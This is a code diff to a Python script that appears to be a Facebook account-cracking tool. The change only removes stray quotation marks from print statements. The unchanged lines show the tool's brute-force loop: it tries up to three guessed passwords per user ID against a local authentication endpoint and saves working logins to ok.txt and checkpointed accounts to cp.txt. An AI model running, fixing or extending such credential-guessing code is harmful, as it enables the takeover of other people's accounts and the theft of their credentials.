@@ -362,13 +362,13 @@ def a_menu_select():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
                     if "loc" in q:
-                        print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1")
+                        print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
-                        print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1")
+                        print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1)
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
@@ -378,13 +378,13 @@ def a_menu_select():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                         q = json.loads(data)
                         if "loc" in q:
-                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2")
+                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2)
                             ok=open("ok.txt","a")
                             ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2")
+                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2)
                             cp=open("cp.txt","a")
                             cp.write(uid+" | "+pass2+"\n")
                             cp.close()
@@ -394,13 +394,13 @@ def a_menu_select():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                             q = json.loads(data)
                             if "loc" in q:
-                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3")
+                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3)
                                 ok=open("ok.txt","a")
                                 ok.write(uid+" | "+pass3+"\n")
                                 ok.close()
                                 oks.append(uid + pass3)
                             elif 'www.facebook.com' in q['error']:
-                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3")
+                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3)
                                 cp=open("cp.txt","a")
                                 cp.write(uid+" | "+pass3+"\n")
                                 cp.close()
@@ -575,13 +575,13 @@ def b_menu_select():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
                     q = json.loads(data)
                     if "loc" in q:
-                        print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1")
+                        print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass1)
                         ok=open("ok.txt","a")
                         ok.write(uid+" | "+pass1+"\n")
                         ok.close()
                         oks.append(uid + pass1)
                     elif 'www.facebook.com' in q['error']:
-                        print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1")
+                        print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass1)
                         cp=open("cp.txt","a")
                         cp.write(uid+" | "+pass1+"\n")
                         cp.close()
@@ -590,13 +590,13 @@ def b_menu_select():
 			data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                         q = json.loads(data)
                         if "loc" in q:
-                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2")
+                            print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass2)
                             ok=open("ok.txt","a")
                             ok.write(uid+" | "+pass2+"\n")
                             ok.close()
                             oks.append(uid + pass2)
                         elif 'www.facebook.com' in q['error']:
-                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2")
+                            print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass2)
                             cp=open("cp.txt","a")
                             cp.write(uid+" | "+pass2+"\n")
                             cp.close()
@@ -605,13 +605,13 @@ def b_menu_select():
 			    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                             q = json.loads(data)
                             if "loc" in q:
-                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3")
+                                print("\033[1;92m[SANI-OK]➤ " + uid + " | " + pass3)
                                 ok=open("ok.txt","a")
                                 ok.write(uid+" | "+pass3+"\n")
                                 ok.close()
                                 oks.append(uid + pass3)
                             elif 'www.facebook.com' in q['error']:
-                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3")
+                                print("\033[1;93m[SANI-CP]➤ " + uid + " | " + pass3)
                                 cp=open("cp.txt","a")
                                 cp.write(uid+" | "+pass3+"\n")
                                 cp.close()
